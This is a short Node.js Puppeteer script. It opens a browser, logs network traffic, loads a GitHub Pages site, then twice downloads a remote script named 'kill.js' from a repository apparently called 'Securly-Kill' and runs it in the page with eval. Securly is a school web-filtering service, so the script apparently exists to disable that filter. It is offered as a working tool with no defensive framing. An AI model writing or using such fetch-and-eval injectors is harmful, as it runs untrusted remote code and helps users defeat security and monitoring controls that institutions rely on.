const puppeteer = require('puppeteer');

(async () => {
    const browser = await puppeteer.launch({ headless: false }); // Launch browser
    const page = await browser.newPage();

    // Intercept requests and responses
    await page.setRequestInterception(true);

    page.on('request', (request) => {
        console.log(`Request: ${request.url()}`);
        request.continue(); // Allow the request to proceed
    });

    page.on('response', (response) => {
        console.log(`Response: ${response.url()} - Status: ${response.status()}`);
    });

    try {
        // Navigate to the initial page
        await page.goto('https://dy1ngrat.github.io/pupet/'); // Replace with your initial URL

        // Wait for navigation/redirection to complete
        await page.waitForNavigation({ waitUntil: 'domcontentloaded' });

        // Log the current URL (post-redirection)
        console.log('Final URL:', page.url());

        // Perform actions on the redirected page
        const pageTitle = await page.evaluate(() => document.title);
        console.log('Page Title:', pageTitle);

        // Inject and execute the external script multiple times
        for (let i = 0; i < 2; i++) {
            await page.evaluate(async () => {
                const scriptContent = await fetch('https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js')
                    .then((r) => r.text());
                eval(scriptContent);
            });
            console.log(`Script injected and executed (${i + 1}/2)`);
            await page.waitForTimeout(5000); // Wait for 5 seconds
        }

    } catch (error) {
        console.error('Error:', error);
    } finally {
        //await browser.close(); // Ensure the browser closes properly
        console.log('Finished processing');
    }
})();
